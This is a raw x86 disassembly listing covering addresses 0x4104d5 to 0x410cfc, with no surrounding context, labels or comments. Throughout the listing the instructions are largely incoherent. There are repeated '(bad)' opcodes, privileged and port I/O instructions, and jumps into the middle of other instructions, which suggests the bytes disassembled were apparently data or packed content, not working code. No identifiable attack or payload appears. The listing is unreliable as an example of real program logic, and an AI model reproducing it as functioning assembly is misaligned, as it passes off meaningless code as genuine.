  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
